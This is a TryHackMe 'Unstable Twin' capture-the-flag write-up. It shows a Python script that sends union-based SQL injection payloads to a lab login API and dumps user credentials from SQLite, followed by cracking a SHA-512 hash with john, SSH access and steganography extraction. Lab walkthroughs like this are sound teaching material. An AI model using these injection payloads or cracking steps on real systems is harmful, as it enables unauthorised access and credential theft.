# Unstable Twin

## Introduction

Welcome to my another writeup! In this TryHackMe [Unstable Twin](https://tryhackme.com/room/unstabletwin) room, you'll learn: SQL injection, basic steganography and more! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★★☆☆☆☆☆☆☆☆

## Table of Content

1. **[Service Enumeration](#service-enumeration)**
2. **[Initial Foothold](#initial-foothold)**
3. **[Final Flag](#final-flag)**
4. **[Conclusion](#conclusion)**

## Background

> A Services based room, extracting information from HTTP Services and finding the hidden messages.
>  
> Difficulty: Medium

---

Based on the Twins film, find the hidden keys.


Julius and Vincent have gone into the **SERVICES** market to try and get the family back together.

They have just deployed a new version of their code, but Vincent has messed up the deployment!


Can you help their mother find and recover the hidden keys and bring the family and girlfriends back together?

## Service Enumeration

As usual, scan the machine for open ports via `rustscan`!

**Rustscan:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Unstable-Twin]
└─# export RHOSTS=10.10.222.235
                                                                                                           
┌──(root🌸siunam)-[~/ctf/thm/ctf/Unstable-Twin]
└─# rustscan --ulimit 5000 -b 4500 -t 2000 --range 1-65535 $RHOSTS -- -sC -sV -oN rustscan/rustscan.txt
[...]
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 baa2408edec37bc7f7b37e0c1eec9fb8 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDP/bNr/nN/6PCa1yFPjA11XH0aZeVg2OMFGyxF3iCBim97a/vA33LYCnDGh7jjSP+wEzu2Xh6whOuRU147tRglKgXMVqMx7GIfBKp92pPnePbCQi6Qy9Sp1hJCIK9Ik2qzYbVOHr6vSJVRGKdZuCDrqip67tHPJSqtDKvuTS8PTcWav17y0IhBrcU2KoGptwml4I/j3RO/aVYblAEKMH0tn9vy59tokTm0CoPXjZCH7KJfL87YAdyacAA6FB2DIFEupf56qGoGNUP9v7AMaF6Uj/5ywDduik/YOdvBR7AVlX2IOaAu4yLRWIh9S4XvlzCB3N+UyQmXRKSzcSyhKXIRJYidCs0SwhCTF+umbmtMAfHghLBz4pkLbhbqrVqkf0GA8wKyG9rX6LSUl6/SwhtAeFPIQxnnP6OHxrcKHy4BooCVNpur5fkioel5VHO90cK0xzlPWGJ8P4HOnDRmLWpyBAmmPjY8BHNB4rLccZLz1e648h7Zs9sFvhjJD8ONgW0=
|   256 38284ce14a753d0de7e48564382a8ec7 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBH7P2OEvegGP6MfdwJdgVn3xIYEH6LXyzBs5hQ5fPpMZDZdHo5a6J2HR+KShaslzYk83WGNBSJt+hQUGv0Kr+Hs=
|   256 1a33a0ed83ba09a562a7dfab2feed099 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIN0pHtBDjHWNJSlxl5M/LfHJztN6HJzi30Ygi1ysEOJN
80/tcp open  http    syn-ack ttl 63 nginx 1.14.1
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD
|_http-server-header: nginx/1.14.1
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
```

According to `rustscan` result, we have 2 ports are opened:

Open Ports        | Service
------------------|------------------------
22                | OpenSSH 8.0
80                | nginx 1.14.1

### HTTP on Port 80

**Adding a new host to `/etc/hosts`:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Unstable-Twin]
└─# echo "$RHOSTS unstabletwin.thm" >> /etc/hosts
```

**Home page:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Unstable-Twin]
└─# curl -vv http://unstabletwin.thm/
*   Trying 10.10.222.235:80...
* Connected to unstabletwin.thm (10.10.222.235) port 80 (#0)
> GET / HTTP/1.1
> Host: unstabletwin.thm
> User-Agent: curl/7.86.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 404 NOT FOUND
< Server: nginx/1.14.1
< Date: Wed, 04 Jan 2023 02:21:57 GMT
< Content-Type: text/html; charset=utf-8
< Content-Length: 0
< Connection: keep-alive
< 
* Connection #0 to host unstabletwin.thm left intact
```

HTTP status code 404 Not Found.

**Let's enumerate hidden directories and files via `gobuster`:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Unstable-Twin]
└─# gobuster dir -u http://unstabletwin.thm/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -t 100
[...]
/info                 (Status: 200) [Size: 148]
/get_image            (Status: 500) [Size: 291]
```

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Unstable-Twin]
└─# gobuster dir -u http://unstabletwin.thm/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -t 100
[...]
```

**`/info`:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Unstable-Twin]
└─# curl -vv http://unstabletwin.thm/info
*   Trying 10.10.222.235:80...
* Connected to unstabletwin.thm (10.10.222.235) port 80 (#0)
> GET /info HTTP/1.1
> Host: unstabletwin.thm
> User-Agent: curl/7.86.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Server: nginx/1.14.1
< Date: Wed, 04 Jan 2023 02:26:03 GMT
< Content-Type: application/json
< Content-Length: 160
< Connection: keep-alive
< Build Number: {Redacted}
< Server Name: Vincent
< 
"The login API needs to be called with the username and password form fields fields.  It has not been fully tested yet so may not be full developed and secure"
```

Hmm... `The login API needs to be called with the username and password form fields fields`.

**We also found a build number and server name.**

**Then I send the same requst, the HTTP headers changed:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Unstable-Twin]
└─# curl -vv http://unstabletwin.thm/info
*   Trying 10.10.222.235:80...
* Connected to unstabletwin.thm (10.10.222.235) port 80 (#0)
> GET /info HTTP/1.1
> Host: unstabletwin.thm
> User-Agent: curl/7.86.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Server: nginx/1.14.1
< Date: Wed, 04 Jan 2023 02:31:24 GMT
< Content-Type: application/json
< Content-Length: 148
< Connection: keep-alive
< Build Number: {Redacted}
< Server Name: Julias
< 
"The login API needs to be called with the username and password fields.  It has not been fully tested yet so may not be full developed and secure"
```

So we can **send a GET request to `/info` to change different API services (Vincent or Julias)?**

**`/get_image`:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Unstable-Twin]
└─# curl -vv http://unstabletwin.thm/get_image
*   Trying 10.10.222.235:80...
* Connected to unstabletwin.thm (10.10.222.235) port 80 (#0)
> GET /get_image HTTP/1.1
> Host: unstabletwin.thm
> User-Agent: curl/7.86.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 500 INTERNAL SERVER ERROR
< Server: nginx/1.14.1
< Date: Wed, 04 Jan 2023 02:30:14 GMT
< Content-Type: text/html
< Content-Length: 291
< Connection: keep-alive
< 
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>500 Internal Server Error</title>
<h1>Internal Server Error</h1>
<p>The server encountered an internal error and was unable to complete your request.  Either the server is overloaded or there is an error in the application.</p>
```

No clue what is it.

Armed with above information, we know that **there is an login API that needs to be called with the username and password fields.**

**Let's try to guess the login API endpoint:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Unstable-Twin]
└─# curl -vv http://unstabletwin.thm/api/login
*   Trying 10.10.222.235:80...
* Connected to unstabletwin.thm (10.10.222.235) port 80 (#0)
> GET /api/login HTTP/1.1
> Host: unstabletwin.thm
> User-Agent: curl/7.86.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 405 METHOD NOT ALLOWED
< Server: nginx/1.14.1
< Date: Wed, 04 Jan 2023 02:56:30 GMT
< Content-Type: text/html
< Content-Length: 178
< Connection: keep-alive
< Allow: POST, OPTIONS
< 
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>405 Method Not Allowed</title>
<h1>Method Not Allowed</h1>
<p>The method is not allowed for the requested URL.</p>
```

- Found login API endpoint: `/api/login`

In here, we received a HTTP status code 405 Method Not Allowed, and we saw it allows POST and OPTIONS method.

**Let's try to send a POST request to `/api/login`:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Unstable-Twin]
└─# curl -vv http://unstabletwin.thm/api/login -X POST
*   Trying 10.10.222.235:80...
* Connected to unstabletwin.thm (10.10.222.235) port 80 (#0)
> POST /api/login HTTP/1.1
> Host: unstabletwin.thm
> User-Agent: curl/7.86.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Server: nginx/1.14.1
< Date: Wed, 04 Jan 2023 02:58:08 GMT
< Content-Type: application/json
< Content-Length: 51
< Connection: keep-alive
< 
"The username or password passed are not correct."

┌──(root🌸siunam)-[~/ctf/thm/ctf/Unstable-Twin]
└─# curl -vv http://unstabletwin.thm/api/login -X POST
*   Trying 10.10.222.235:80...
* Connected to unstabletwin.thm (10.10.222.235) port 80 (#0)
> POST /api/login HTTP/1.1
> Host: unstabletwin.thm
> User-Agent: curl/7.86.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Server: nginx/1.14.1
< Date: Wed, 04 Jan 2023 02:59:54 GMT
< Content-Type: application/json
< Content-Length: 3
< Connection: keep-alive
< 
[]
```

**Now we received `The username or password passed are not correct.`, and an empty JSON array.**

> Note: When you send the request, the build number and server name changes, that's why we need to send 2 requests.

**Let's try to provide those parameters:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Unstable-Twin]
└─# curl -vv http://unstabletwin.thm/api/login -X POST -d "username=test&password=test"
Note: Unnecessary use of -X or --request, POST is already inferred.
*   Trying 10.10.222.235:80...
* Connected to unstabletwin.thm (10.10.222.235) port 80 (#0)
> POST /api/login HTTP/1.1
> Host: unstabletwin.thm
> User-Agent: curl/7.86.0
> Accept: */*
> Content-Length: 27
> Content-Type: application/x-www-form-urlencoded
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Server: nginx/1.14.1
< Date: Wed, 04 Jan 2023 03:01:13 GMT
< Content-Type: application/json
< Content-Length: 3
< Connection: keep-alive
< 
[]
                                                                                                           
┌──(root🌸siunam)-[~/ctf/thm/ctf/Unstable-Twin]
└─# curl -vv http://unstabletwin.thm/api/login -X POST -d "username=test&password=test"
Note: Unnecessary use of -X or --request, POST is already inferred.
*   Trying 10.10.222.235:80...
* Connected to unstabletwin.thm (10.10.222.235) port 80 (#0)
> POST /api/login HTTP/1.1
> Host: unstabletwin.thm
> User-Agent: curl/7.86.0
> Accept: */*
> Content-Length: 27
> Content-Type: application/x-www-form-urlencoded
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Server: nginx/1.14.1
< Date: Wed, 04 Jan 2023 03:01:14 GMT
< Content-Type: application/json
< Content-Length: 51
< Connection: keep-alive
< 
"The username or password passed are not correct."
```

## Initial Foothold

**Now, we can write a simple python script to test SQL injection:**
```py
#!/usr/bin/env python3

import requests
from threading import Thread
from time import sleep

def sendRequest(url, data, number):
    requestResult = requests.post(url + 'api/login', data=data)
    print(f'[*] Sending request number: {number + 1}')

    print(requestResult.text)


def main():
    url = 'http://unstabletwin.thm/'
    payload = """' OR 1=1-- -"""

    data = {
        'username': payload,
        'password': 'test'
    }

    for number in range(2):
        thread = Thread(target=sendRequest, args=(url, data, number))
        thread.start()
        sleep(0.1)

if __name__ == '__main__':
    main()
```

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Unstable-Twin]
└─# python3 sqli.py
[*] Sending request number: 1
[
  [
    2, 
    "julias"
  ], 
  [
    4, 
    "linda"
  ], 
  [
    5, 
    "marnie"
  ], 
  [
    1, 
    "mary_ann"
  ], 
  [
    3, 
    "vincent"
  ]
]

[*] Sending request number: 2
"The username or password passed are not correct."
```

- Found user: `julias`, `linda`, `marnie`, `mary_ann`, `vincent`

Now, we can confirm the login API is vulnerable to SQL injection.

**Then, we can enumerate the database:**
```py
payload = """' UNION ALL SELECT NULL,NULL-- -"""
```

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Unstable-Twin]
└─# python3 sqli.py
[*] Sending request number: 1
"The username or password passed are not correct."

[*] Sending request number: 2
[
  [
    null, 
    null
  ]
]
```

- Found 2 columns

```py
payload = """' UNION ALL SELECT 'string1','string2'-- -"""
```

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Unstable-Twin]
└─# python3 sqli.py
[*] Sending request number: 1
"The username or password passed are not correct."

[*] Sending request number: 2
[
  [
    "string1", 
    "string2"
  ]
]
```

Both columns accpet string data type.

**Find which DBMS (Database Management System):**
```py
payload = """' UNION ALL SELECT NULL,sqlite_version()-- -"""
```

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Unstable-Twin]
└─# python3 sqli.py
[*] Sending request number: 1
"The username or password passed are not correct."

[*] Sending request number: 2
[
  [
    null, 
    "3.26.0"
  ]
]
```

- DBMS information: SQLite version 3.26.0

**Next, we can enumerate table names:** (Payloads from [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md))
```py
payload = """' UNION ALL SELECT NULL,tbl_name FROM sqlite_master-- -"""
```

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Unstable-Twin]
└─# python3 sqli.py
[*] Sending request number: 1
"The username or password passed are not correct."

[*] Sending request number: 2
[
  [
    null, 
    "users"
  ], 
  [
    null, 
    "users"
  ], 
  [
    null, 
    "users"
  ], 
  [
    null, 
    "users"
  ], 
  [
    null, 
    "sqlite_sequence"
  ], 
  [
    null, 
    "notes"
  ], 
  [
    null, 
    "notes"
  ], 
  [
    null, 
    "notes"
  ], 
  [
    null, 
    "users"
  ]
]
```

- Found table name: `users`, `sqlite_sequence`, `notes`

**Enumerate column names:**
```py
payload = """' UNION ALL SELECT NULL,sql FROM sqlite_master-- -"""
```

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Unstable-Twin]
└─# python3 sqli.py
[*] Sending request number: 1
"The username or password passed are not correct."

[*] Sending request number: 2
[
  [
    null, 
    "CREATE TABLE \"users\" (\n\t\"id\"\tINTEGER UNIQUE,\n\t\"username\"\tTEXT NOT NULL UNIQUE,\n\t\"password\"\tTEXT NOT NULL UNIQUE,\n\tPRIMARY KEY(\"id\" AUTOINCREMENT)\n)"
  ], 
  [
    null, 
    null
  ], 
  [
    null, 
    null
  ], 
  [
    null, 
    null
  ], 
  [
    null, 
    "CREATE TABLE sqlite_sequence(name,seq)"
  ], 
  [
    null, 
    "CREATE TABLE \"notes\" (\n\t\"id\"\tINTEGER UNIQUE,\n\t\"user_id\"\tINTEGER,\n\t\"note_sql\"\tINTEGER,\n\t\"notes\"\tTEXT,\n\tPRIMARY KEY(\"id\")\n)"
  ], 
  [
    null, 
    null
  ], 
  [
    null, 
    "CREATE INDEX \"note_ids\" ON \"notes\" (\n\t\"id\"\tASC,\n\t\"user_id\"\tASC,\n\t\"note_sql\"\tASC\n)"
  ], 
  [
    null, 
    "CREATE INDEX \"id\" ON \"users\" (\n\t\"id\"\n)"
  ]
]
```

We can ignore table `sqlite_sequence`, as it's a default table in SQLite.

- Table `users`'s column name: `id`, `username`, `password`
- Table `notes`'s column name: `id`, `user_id`, `note_sql`, `notes`

**Table `users` is holding users' credentials, let's extract it's data:**
```py
payload = """' UNION ALL SELECT NULL,id || ':' || username || ':' || password FROM users-- -"""
```

> Note: The `||` is the string concatenation, which allows you to query multiple columns in a single column.

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Unstable-Twin]
└─# python3 sqli.py
[*] Sending request number: 1
"The username or password passed are not correct."

[*] Sending request number: 2
[
  [
    null, 
    "1:mary_ann:continue..."
  ], 
  [
    null, 
    "2:julias:Red"
  ], 
  [
    null, 
    "3:vincent:{Redacted}"
  ], 
  [
    null, 
    "4:linda:Green"
  ], 
  [
    null, 
    "5:marnie:Yellow "
  ]
]
```

Nothing weird.

**Extract table `notes` data:**
```py
payload = """' UNION ALL SELECT NULL,id || ':' || user_id || ':' || note_sql || ':' || notes FROM notes-- -"""
```

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Unstable-Twin]
└─# python3 sqli.py
[*] Sending request number: 1
"The username or password passed are not correct."

[*] Sending request number: 2
[
  [
    null, 
    "1:1:1:I have left my notes on the server.  They will me help get the family back together. "
  ], 
  [
    null, 
    "2:1:2:My Password is {Redacted}\n"
  ]
]
```

- Found user id `2` (user `mary_ann`)'s password hash

**Let's crack that:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Unstable-Twin]
└─# hash-identifier '{Redacted}'
[...]
Possible Hashs:
[+] SHA-512
[+] Whirlpool

Least Possible Hashs:
[+] SHA-512(HMAC)
[+] Whirlpool(HMAC)
```

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Unstable-Twin]
└─# echo '{Redacted}' > mary_ann.txt

┌──(root🌸siunam)-[~/ctf/thm/ctf/Unstable-Twin]
└─# john --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-SHA512 mary_ann.txt
[...]
{Redacted}       (?)
```

Cracked!

**Let's try to SSH to user  `mary_ann`:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Unstable-Twin]
└─# ssh mary_ann@$RHOSTS          
mary_ann@10.10.222.235's password: 
Last login: Sun Feb 14 09:56:18 2021 from 192.168.20.38
Hello Mary Ann
[mary_ann@UnstableTwin ~]$ whoami;hostname;id;ip a
mary_ann
UnstableTwin
uid=1000(mary_ann) gid=1000(mary_ann) groups=1000(mary_ann) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc fq_codel state UP group default qlen 1000
    link/ether 02:90:17:dd:6a:55 brd ff:ff:ff:ff:ff:ff
    inet 10.10.222.235/16 brd 10.10.255.255 scope global dynamic noprefixroute eth0
       valid_lft 2071sec preferred_lft 2071sec
    inet6 fe80::90:17ff:fedd:6a55/64 scope link 
       valid_lft forever preferred_lft forever
```

I'm user `mary_ann`!

**user.flag:**
```
[mary_ann@UnstableTwin ~]$ cat user.flag 
THM{Redacted}
```

## Final Flag

Let's do some basic enumerations!

**Home directory:**
```
[mary_ann@UnstableTwin ~]$ ls -lah
total 24K
drwx------. 3 mary_ann mary_ann 138 Feb 13  2021 .
drwxr-xr-x. 3 root     root      22 Feb 13  2021 ..
-rw-------. 1 mary_ann mary_ann 115 Feb 13  2021 .bash_history
-rw-r--r--. 1 mary_ann mary_ann  18 Jul 21  2020 .bash_logout
-rw-r--r--. 1 mary_ann mary_ann 141 Jul 21  2020 .bash_profile
-rw-r--r--. 1 mary_ann mary_ann 424 Feb 13  2021 .bashrc
drwx------. 2 mary_ann mary_ann  44 Feb 13  2021 .gnupg
-rw-r--r--. 1 mary_ann mary_ann 219 Feb 13  2021 server_notes.txt
-rw-r--r--. 1 mary_ann mary_ann  20 Feb 13  2021 user.flag
```

**`/home/mary_ann/server_notes.txt`:**
```
[mary_ann@UnstableTwin ~]$ cat server_notes.txt 
Now you have found my notes you now you need to put my extended family together.

We need to GET their IMAGE for the family album.  These can be retrieved by NAME.

You need to find all of them and a picture of myself!
```

**`/home/mary_ann/.bash_history`:**
```
[mary_ann@UnstableTwin ~]$ cat .bash_history 
ls
history
vi .bashrc
exit
vi .bashrc
ls
./linpeas.sh 
ll
rm mary_ann_pwd_enc.txt 
cat user.flag 
vi .bashrc 
exit
```

**Check `/opt` directory:**
```
[mary_ann@UnstableTwin ~]$ ls -lah /opt
total 0
drwxr-xr-x.  3 root root  26 Feb 13  2021 .
dr-xr-xr-x. 17 root root 224 Feb 14  2021 ..
drwxr-xr-x.  3 root root 288 Feb 13  2021 unstabletwin

[mary_ann@UnstableTwin ~]$ ls -lah /opt/unstabletwin/
total 628K
drwxr-xr-x. 3 root root  288 Feb 13  2021  .
drwxr-xr-x. 3 root root   26 Feb 13  2021  ..
-rw-r--r--. 1 root root  40K Feb 13  2021  database.db
-rw-r--r--. 1 root root 1.2K Feb 13  2021  main_5000.py
-rw-r--r--. 1 root root 1.8K Feb 13  2021  main_5001.py
drwxr-xr-x. 2 root root   36 Feb 13  2021  __pycache__
-rw-r--r--. 1 root root  934 Feb 13  2021  queries.py
-rw-r--r--. 1 root root 313K Feb 10  2021 'Twins (1988).html'
-rw-r--r--. 1 root root  56K Feb 13  2021  Twins-Arnold-Schwarzenegger.jpg
-rw-r--r--. 1 root root  47K Feb 13  2021  Twins-Bonnie-Bartlett.jpg
-rw-r--r--. 1 root root  50K Feb 13  2021  Twins-Chloe-Webb.jpg
-rw-r--r--. 1 root root  42K Feb 13  2021  Twins-Danny-DeVito.jpg
-rw-r--r--. 1 root root  58K Feb 13  2021  Twins-Kelly-Preston.jpg
```

- Found directory `/opt/unstabletwin`

**`main_5000.py`:**
```py
from flask import Flask, jsonify, request, send_file


app = Flask(__name__)


@app.route('/')
def hello_world():
    return '', 404


@app.route('/api')
def hello_api():
    return '', 404


@app.route('/api/login',  methods=['POST'])
def hello_login():
    d = "The username or password passed are not correct."
    return jsonify(d)


@app.route('/info')
def hello_info():
    d = "The login API needs to be called with the username and password fields.  It has not been fully tested yet " \
        "so may not be full developed and secure"
    return jsonify(d), 200, {'Build Number': '{Redacted}', 'Server Name': "Julias"}


@app.route('/get_image')
def get_image():
    if request.args.get('name').lower() == 'marnie':
        filename = 'Twins-Kelly-Preston.jpg'
        return send_file(filename, mimetype='image/gif')
    elif request.args.get('name').lower() == 'linda':
        filename = 'Twins-Chloe-Webb.jpg'
        return send_file(filename, mimetype='image/gif')
    elif request.args.get('name').lower() == 'mary_ann':
        filename = 'Twins-Bonnie-Bartlett.jpg'
        return send_file(filename, mimetype='image/gif')
    return '', 404


if __name__ == '__main__':
    app.run(port=5000)
```

**`main_5001.py`:**
```py
from flask import Flask, g, jsonify, request, send_file
import sqlite3

from queries import test_run_query, run_query

app = Flask(__name__)

DATABASE = '/opt/unstabletwin/database.db'


def get_db():
    db = getattr(g, '_database', None)
    if db is None:
        db = g._database = sqlite3.connect(DATABASE)
    return db


@app.teardown_appcontext
def close_connection(exception):
    db = getattr(g, '_database', None)
    if db is not None:
        db.close()


@app.route('/')
def hello_world():
    return '', 404


@app.route('/api')
def hello_api():
    return '', 404


@app.route('/api/login',  methods=['POST'])
def hello_login_get():
    username = request.form.get('username')
    password = request.form.get('password')
    db = get_db()
    d = run_query(db, username, password)
    # print(d)
    return jsonify(d)


@app.route('/info')
def hello_info():
    d = "The login API needs to be called with the username and password form fields fields.  " \
        "It has not been fully tested yet so may not be full developed and secure"
    return jsonify(d), 200, {'Build Number': '{Redacted}', 'Server Name': "Vincent"}


@app.route('/get_image')
def get_image():
    if request.args.get('name').lower() == 'vincent':
        filename = 'Twins-Danny-DeVito.jpg'
        return send_file(filename, mimetype='image/gif')
    elif request.args.get('name').lower() == 'julias':
        filename = 'Twins-Arnold-Schwarzenegger.jpg'
        return send_file(filename, mimetype='image/gif')
    elif request.args.get('name').lower() == 'mary_ann':
        filename = 'Twins-Bonnie-Bartlett.jpg'
        return send_file(filename, mimetype='image/gif')
    return '', 404

#@app.route('/test')
#def test_api():
#    db = get_db()
#    test_run_query(db)
#    return '', 404


if __name__ == '__main__':
    app.run(port=5001)
```

**Armed with above information, there are 2 Python Flask running on port `5000` and `5001`:**

- Port 5000:
    - `/get_image` with GET parameter `marnie` or `linda` or `mary_ann`, will get file `Twins-Kelly-Preston.jpg`, `Twins-Chloe-Webb.jpg`, `Twins-Bonnie-Bartlett.jpg`
- Port 5001:
    - `/get_image` with GET parameter `vincent` or `julias` or `mary_ann`, will get file `Twins-Danny-DeVito.jpg`, `Twins-Arnold-Schwarzenegger.jpg`, `Twins-Bonnie-Bartlett.jpg`

**Let's download all the images:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Unstable-Twin]
└─# curl -s http://unstabletwin.thm/get_image --get -d "name=vincent" -o vincent.jpg
                                                                                                           
┌──(root🌸siunam)-[~/ctf/thm/ctf/Unstable-Twin]
└─# curl -s http://unstabletwin.thm/get_image --get -d "name=vincent" -o vincent.jpg
                                                                                                           
┌──(root🌸siunam)-[~/ctf/thm/ctf/Unstable-Twin]
└─# curl -s http://unstabletwin.thm/get_image --get -d "name=julias" -o julias.jpg
                                                                                                           
┌──(root🌸siunam)-[~/ctf/thm/ctf/Unstable-Twin]
└─# curl -s http://unstabletwin.thm/get_image --get -d "name=julias" -o julias.jpg
                                                                                                           
┌──(root🌸siunam)-[~/ctf/thm/ctf/Unstable-Twin]
└─# curl -s http://unstabletwin.thm/get_image --get -d "name=mary_ann" -o mary_ann.jpg
                                                                                                           
┌──(root🌸siunam)-[~/ctf/thm/ctf/Unstable-Twin]
└─# curl -s http://unstabletwin.thm/get_image --get -d "name=marnie" -o marnie.jpg
                                                                                                           
┌──(root🌸siunam)-[~/ctf/thm/ctf/Unstable-Twin]
└─# curl -s http://unstabletwin.thm/get_image --get -d "name=marnie" -o marnie.jpg
                                                                                                           
┌──(root🌸siunam)-[~/ctf/thm/ctf/Unstable-Twin]
└─# curl -s http://unstabletwin.thm/get_image --get -d "name=linda" -o linda.jpg 
                                                                                                           
┌──(root🌸siunam)-[~/ctf/thm/ctf/Unstable-Twin]
└─# curl -s http://unstabletwin.thm/get_image --get -d "name=linda" -o linda.jpg
```

**Now, we can use `steghide` to extract all hidden stuff:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Unstable-Twin]
└─# steghide extract -sf julias.jpg
Enter passphrase: 
wrote extracted data to "julias.txt".
                                                                                                           
┌──(root🌸siunam)-[~/ctf/thm/ctf/Unstable-Twin]
└─# steghide extract -sf linda.jpg 
Enter passphrase: 
wrote extracted data to "linda.txt".
                                                                                                           
┌──(root🌸siunam)-[~/ctf/thm/ctf/Unstable-Twin]
└─# steghide extract -sf marnie.jpg 
Enter passphrase: 
wrote extracted data to "marine.txt".
                                                                                                           
┌──(root🌸siunam)-[~/ctf/thm/ctf/Unstable-Twin]
└─# steghide extract -sf mary_ann.jpg
Enter passphrase: 
wrote extracted data to "mary_ann.txt".
                                                                                                           
┌──(root🌸siunam)-[~/ctf/thm/ctf/Unstable-Twin]
└─# steghide extract -sf vincent.jpg 
Enter passphrase: 
wrote extracted data to "vincent.txt".
```

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Unstable-Twin]
└─# cat *.txt       
Red - 1DVsdb2uEE0k5HK4GAIZ
Green - {Redacted} 
Yellow - {Redacted}
You need to find all my children and arrange in a rainbow!
Orange - PS0Mby2jomUKLjvQ4OSw
```

**Arrange in a rainbow colors:** (**Red, orange, yellow, green, blue, indigo, violet**)
```
Red - 1DVsdb2uEE0k5HK4GAIZ
Orange - PS0Mby2jomUKLjvQ4OSw
Yellow - {Redacted}
Green - {Redacted}

1DVsdb2uEE0k5HK4GAIZPS0Mby2jomUKLjvQ4OSw{Redacted}
```

**Let's use [dcode.fr](https://www.dcode.fr/base62-encoding) to decode that:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Unstable-Twin/images/Pasted%20image%2020230103233719.png)

Nice!

# Conclusion

What we've learned:

1. Enumerating Hidden Directories and Files via `gobuster`
2. Exploiting Union-Based SQL injection
3. Cracking Password Hash
4. Basic Steganography